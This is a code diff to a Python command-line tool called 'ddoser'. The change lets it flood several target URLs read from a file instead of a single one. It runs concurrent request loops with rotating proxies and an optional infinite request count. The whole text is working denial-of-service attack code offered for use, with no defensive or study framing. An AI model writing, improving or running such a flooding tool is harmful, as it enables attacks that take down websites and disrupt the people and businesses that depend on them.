@@ -54,26 +54,38 @@ async def ddos(target_url: str, timeout: int, count: int, verbose: bool, proxy_i
         await make_request(target_url, proxy, verbose, timeout)
 
 
-async def amain(target_url: str, timeout: int, concurrency: int, count: int, verbose: bool, proxies: List[Tuple[str, str, int]]):
+async def amain(target_urls: List[str], timeout: int, concurrency: int, count: int, verbose: bool, proxies: List[Tuple[str, str, int]]):
     coroutines = []
     proxy_iterator = cycle(proxies or [])
-    for _ in range(concurrency):
-        coroutines.append(ddos(target_url, timeout, count, verbose, proxy_iterator))
+    for target_url in target_urls:
+        for _ in range(concurrency):
+            coroutines.append(ddos(target_url, timeout, count, verbose, proxy_iterator))
     await asyncio.gather(*coroutines)
 
 
 @click.command(help="Run ddoser")
-@click.option('--target-url', help='ddos target url', required=True)
+@click.option('--target-url', help='ddos target url')
+@click.option('--target-urls-file', help='path to file contains urls to ddos')
 @click.option('--proxy-url', help='url to proxy resourse')
 @click.option('--proxy-file', help='path to file with proxy list')
 @click.option('--concurrency', help='concurrency level', type=int, default=1)
 @click.option('--count', help='requests count (0 for infinite)', type=int, default=1)
 @click.option('--timeout', help='requests timeout', type=int, default=5)
 @click.option('--verbose', help='Show verbose log', is_flag=True, default=False)
-def main(target_url: str, proxy_url: str, proxy_file: str, concurrency: int, count: int, timeout: int, verbose: bool):
+def main(
+        target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
+        concurrency: int, count: int, timeout: int, verbose: bool):
+    if not target_urls_file and not target_url:
+        raise SystemExit('--target-url or --target-urls-file is required')
     proxies = load_proxies(proxy_file, proxy_url)
+    target_urls = []
+    if target_urls_file:
+        with open(target_urls_file) as f:
+            target_urls.extend(line.strip() for line in f)
+    if target_url:
+        target_urls.append(target_url)
     loop = asyncio.get_event_loop()
-    loop.run_until_complete(amain(target_url, timeout, concurrency, count, verbose, proxies))
+    loop.run_until_complete(amain(target_urls, timeout, concurrency, count, verbose, proxies))
     for key, value in STATS.items():
         if key != 'success':
             print(f"{key}: {value}")
